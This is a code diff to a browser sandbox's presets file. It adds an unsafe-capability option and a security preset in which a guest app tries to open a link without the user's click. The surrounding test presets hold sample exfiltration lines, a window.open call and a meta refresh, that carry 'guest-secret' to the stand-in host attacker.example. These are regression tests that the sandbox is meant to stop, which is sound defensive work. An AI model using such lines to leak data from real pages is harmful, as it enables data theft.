@@ -8,7 +8,7 @@
  * research folder whose reproduction does not run it.
  */
 
-import type { SafeCapability } from "../csp-directives";
+import type { SafeCapability, UnsafeCapability } from "../csp-directives";
 import type { SandboxConfigOptions } from "../host";
 import type { StrictSandboxOrigins } from "./csp/origins";
 
@@ -17,18 +17,18 @@ import type { StrictSandboxOrigins } from "./csp/origins";
  * is. A spec may still run a preset in another mode (`{ ...preset.rules, mode }`), so its origins are ones every mode
  * can take: no `scripts`, which strict mode does not take.
  */
-export type PresetRules = SandboxConfigOptions & { mode: 'sealed' | 'strict' | 'cooperative' | 'worker'; origins?: StrictSandboxOrigins };
+export type PresetRules = SandboxConfigOptions & { mode: 'sealed' | 'strict' | 'cooperative' | 'worker'; origins?: StrictSandboxOrigins; unsafeCapabilities?: UnsafeCapability[] };
 
 export interface Preset {
     id: string;
     label: string;
     // 'security': an attack the sandbox must stop; every one has a regression spec. 'demo': a feature tour.
     category: 'security' | 'demo';
-    // How `code` runs: as a script through execute() (needs scriptUnsafe) or as guest markup through load().
+    // How `code` runs: as a script through execute() (needs scriptUnsafe) or as the app's markup, its `html`.
     run: 'script' | 'markup';
     code: string;
     rules: PresetRules;
-    // Registered on the sandbox before it is built (registerFiles); the guest reads them through sandboxFiles.
+    // The app's files, given to start() with it; the guest reads them through sandboxFiles.
     files?: Record<string, string>;
     // A URL in `code` (and every variant) that stands for the attacker: specs aim it at a listener outside the
     // browser (test/e2e/recorder.ts). The playground keeps it as written.
@@ -538,7 +538,7 @@ console.log('TEST_DONE');`,
         research: "13_popup_exfiltration",
         target: "https://attacker.example",
         // A popup is a new top-level window that no CSP governs: its URL carries data out. allow-popups passed
-        // as a regular capability is dropped (with a warning); only unsafeCapabilities enables it.
+        // as a regular capability is refused (start() throws); only unsafeCapabilities enables it.
         code: `let outcome;
 try {
     outcome = window.open('https://attacker.example/?leak=guest-secret') ? 'opened' : 'refused';
@@ -563,6 +563,30 @@ console.log('POPUP ' + outcome);`,
             "meta refresh": `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=guest-secret">`,
         },
         rules: { mode: "cooperative", capabilities: ["allow-scripts"] }
+    },
+    "links-without-the-click": {
+        id: "links-without-the-click",
+        label: "Security Test: Links Without the Click",
+        category: "security",
+        run: "markup",
+        target: "https://docs.example.com/guide",
+        // `links` (design 02, I6): the embedder lists the URL, and the app links to it. The popup blocker allows a tab for 5
+        // seconds after a click anywhere on the page (research 30), so an app that could ask for its link would pick the
+        // moment after any click. Here it tries everything it has once the user clicks the grey area: it focuses the link,
+        // moves it, and calls every name a request could have. No tab opens; the user's own click on the link opens it.
+        code: `<a id="real" href="https://docs.example.com/guide" style="position:absolute;left:10px;top:10px;width:100px;height:40px;display:block">Read the guide</a>
+<div id="bg" style="position:absolute;left:0;right:0;top:60px;bottom:0;background:#eee">Click here: the app then asks for its link without your click on it</div>
+<p id="decoy" style="position:absolute;left:0;bottom:0;margin:0">no tab opens until you click the link</p>`,
+        files: {
+            "main.js": `sandboxView.on('click', 'bg', async () => {
+  sandboxView.set('real', { focus: true });
+  for (const name of ['sandbox:open', 'sandbox:link', 'open']) {
+    try { await bridge.call(name, 0); } catch (error) { console.log(name, error.code); }
+  }
+  console.log('asked without the click: no tab opened');
+});`,
+        },
+        rules: { mode: "sealed", entry: "main.js", links: ["https://docs.example.com/guide"], watchdogTimeout: 2000 },
     },
 } satisfies Record<string, Preset>;
 
